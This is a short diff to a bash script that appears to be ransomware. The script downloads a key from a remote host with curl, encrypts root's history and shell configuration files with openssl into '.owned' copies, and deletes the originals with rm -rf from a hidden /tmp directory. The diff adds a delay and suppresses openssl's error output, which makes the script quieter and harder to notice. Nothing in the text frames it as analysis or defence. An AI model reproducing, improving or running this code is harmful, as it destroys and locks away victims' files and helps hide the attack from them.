@@ -26,6 +26,8 @@ fileList=("/root/.history" "/root/.bash_history" "/root/.bashrc" \
 mkdir -p /tmp/.../
 cd /tmp/.../
 
+sleep 30
+
 curl http://192.168.1.132:8080/pub.pem > ./pub.pem &>/dev/null
 curl http://192.168.1.132:8080/key.bin > ./key.bin &>/dev/null
 
@@ -46,7 +48,7 @@ for ((num=0; num<"${#fileList[@]}"; num++))
 do
   for file in "${fileList[${num}]}"
   do
-    openssl enc -aes-256-cbc -salt -in "${file}" -out "${file}.owned" -pass file:./key.bin 2>&1
+    openssl enc -aes-256-cbc -salt -in "${file}" -out "${file}.owned" -pass file:./key.bin &>/dev/null
 
     rm -rf ${file} &>/dev/null
   done
